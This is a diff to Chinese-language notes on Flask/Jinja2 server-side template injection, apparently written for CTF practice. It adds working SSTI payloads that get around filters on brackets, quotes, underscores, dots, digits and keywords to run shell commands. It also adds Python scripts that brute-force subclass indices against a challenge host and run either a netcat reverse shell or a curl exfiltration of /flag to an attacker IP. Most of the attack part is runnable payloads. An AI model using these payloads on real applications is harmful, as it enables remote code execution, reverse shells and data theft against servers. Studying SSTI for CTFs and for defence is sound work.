@@ -325,7 +325,7 @@ EXP    `{%print lipsum.__globals__['os'].popen('env').read()%}`
 
 #### 2.  `[  ]`
 
-禁了`[ ]`，替换一下。
+禁了`[ ]`，可以用`__getitem__`、`pop`、`get`等方法替换。
 
 ```python
 dict['__builtins__']
@@ -338,11 +338,16 @@ list.__getitem__(0)
 list.pop(0)
 ```
 
-EXP  `{{lipsum.__globals__.pop('os').popen('env').read()}}`
+EXP
+
+```python
+{{"".__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(133).__init__.__globals__.__getitem__('popen')('env').read()}}
+{{lipsum.__globals__.pop('os').popen('env').read()}}
+```
 
 #### 3.  `'  "`
 
-禁了`' "`，用表示`request` 绕过。
+禁了`' "`，用 `request` 传参绕过，把字符串放在 GET、POST、Cookie 这些位置里。
 
 EXP
 
@@ -355,9 +360,19 @@ a1=os&a2=env
 url : ...?a1=os&a2=env
 ```
 
+如果 `args` 被过滤，可以换成 `request.form`、`request.cookies`、`request.values`。
+
+```python
+{{url_for.__globals__[request.cookies.a].popen(request.cookies.b).read()}}
+Cookie: a=os; b=env
+
+{{url_for.__globals__[request.values.a].popen(request.values.b).read()}}
+GET 或 POST: a=os&b=env
+```
+
 #### 4.  `_`
 
-禁了`_`，三种方式绕过。
+禁了`_`，可以先构造出下划线，再用 `attr()` 调属性。
 
 构造获取
 
@@ -372,9 +387,192 @@ url : ...?a1=os&a2=env
  
 ```
 
+也可以和 `request` 一起用，直接从参数里传 `__globals__`。
+
+```python
+url : ...?nss=__globals__
+{{ (lipsum|attr(request.args.nss)).os.popen('env').read() }}
+```
+
+#### 5.  `.`
+
+禁了`.`，可以用`[]`或者`attr()`过滤器绕过。
+
+```python
+{{"".__class__}}
+{{""['__class__']}}
+{{""|attr('__class__')}}
+```
+
+EXP
+
+```python
+{{""['__class__']['__bases__'][0]['__subclasses__']()[133]['__init__']['__globals__']['popen']('env')['read']()}}
+{{""|attr('__class__')|attr('__bases__')|attr('__getitem__')(0)|attr('__subclasses__')()|attr('__getitem__')(133)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('env')|attr('read')()}}
+```
+
+#### 6.  `0-9`
+
+禁了数字，可以用`count`或者`length`构造数字。
+
+```python
+{{ ()|count }}  0
+{{ dict(e=a)|join|count }}  1
+{{ dict(ee=a)|join|count }}  2
+```
+
+需要比较大的下标时，就把 key 写长一点，`join` 取字典的 key，`count` 取长度。
+
+```python
+{{"".__class__.__bases__[()|count].__subclasses__()[(dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count)].__init__.__globals__['popen']('env').read()}}
+```
+
+#### 7.  关键字
+
+禁了`class`、`base`、`globals`、`popen`这种关键字，可以用拼接或者反转绕过。
+
+```python
+{{dict(__in=a,it__=a)|join}}  # __init__
+{{lipsum['__glob'~'als__']['o'~'s']['pop'~'en']('env').read()}}
+{{lipsum['__slabolg__'|reverse]['so'|reverse]['nepop'|reverse]('vne'|reverse)['daer'|reverse]()}}
+```
+
+如果`+`也被过滤，用`~`或者`join`拼接。
+
+#### 8.  多重过滤
+
+遇到多个字符一起过滤时，思路就是把需要的东西全部动态构造出来：`__globals__`、`__getitem__`、`os`、`popen`、命令和`read`。
+
+过滤了`.`、`[]`、`request`、`' "`、`+`时：
+
+```python
+{% set getitem = dict(__getitem__=a)|join %}
+{% set globals = dict(__globals__=a)|join %}
+{% set os = dict(os=a)|join %}
+{% set popen = dict(popen=a)|join %}
+{% set payload = dict(env=a)|join %}
+{% set read = dict(read=a)|join %}
+{{ lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)() }}
+```
+
+过滤了`_`、`.`、`0-9`、`\`、`' "`、`[]`和空格时，可以先构造数字、空格和下划线。
+
+```python
+{%set nine=dict(aaaaaaaaa=a)|join|count%}
+{%set pop=dict(pop=a)|join%}
+{%set kg=(lipsum|string|list)|attr(pop)(nine)%}
+{%set eighteen=nine+nine%}
+{%set xhx=(lipsum|string|list)|attr(pop)(eighteen)%}
+{%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join%}
+{%set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join%}
+{%set os=dict(os=a)|join%}
+{%set popen=dict(popen=a)|join%}
+{%set payload=dict(env=a)|join%}
+{%set read=dict(read=a)|join%}
+{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(payload)|attr(read)()}}
+```
+
+如果`+`也被过滤，上面的`eighteen=nine+nine`可以改成直接用长度构造。
+
+```python
+{%set eighteen=dict(aaaaaaaaaaaaaaaaaa=a)|join|count%}
+```
+
+
+
+### 6.  无回显
+
+#### 1.  反弹shell
+
+```python
+import requests
+
+url = "http://node5.anna.nssctf.cn:26650/level/3"
+
+for i in range(500):
+
+    payload = f"{{{{().__class__.__bases__[0].__subclasses__()[{i}].__init__.__globals__['popen']('netcat 192.168.54.100 7777 -e /bin/bash').read()}}}}"
+
+    data = {
+        "code": payload
+    }
+
+    print("testing:", i)
+
+    try:
+        r = requests.post(url, data=data)
+
+	except:
+        pass
+```
+
+kali 监听相应端口。`nc -lvp 7777`
+
+#### 2.  带外
+
+```python
+import requests
+
+url = "http://node5.anna.nssctf.cn:26650/level/3"
+
+for i in range(500):
+
+    payload = f"{{{{().__class__.__bases__[0].__subclasses__()[{i}].__init__.__globals__['popen']('curl http://192.168.54.100/`cat /flag`').read()}}}}"
+
+    data = {
+        "code": payload
+    }
+
+    print("testing:", i)
+
+    try:
+        r = requests.post(url, data=data)
+
+
+    except:
+        pass
+```
+
+kali 监听，`python3 -m http.server 80`
+
+#### 3.  内存马
+
+
+
+#### 4.  静态目录
+
+`{{lipsum.__globals__['os'].popen('echo "test" >/app/static/1.txt').read()}}`
+
+然后访问 `/static/1.txt`
+
+
+
+### 7.  config  文件
+
+#### 1.  无过滤
+
+`{{config}}`
+
+#### 2.   flask内置函数：
+
+| 函数                  | 作用           |
+| --------------------- | -------------- |
+| `lipsum`              | 可加载第三方库 |
+| `url_for`             | 可返回url路径  |
+| `get_flashed_message` | 可获取消息     |
+
+使用内置函数调用 current_app 模块进而查看配置文件，current_app 可输出当前 app (即 flask )，所以可以通过内置函数获得 current_app 进而获得 config 。
+
+```python
+ {{url_for.__globals__['current_app'].config}}
+ 或者：
+ {{get_flashed_messages.__globals__['current_app'].config}}
+```
+
+
+
 ## Node.js
 
 ## PHP
 
 ## Spring
-
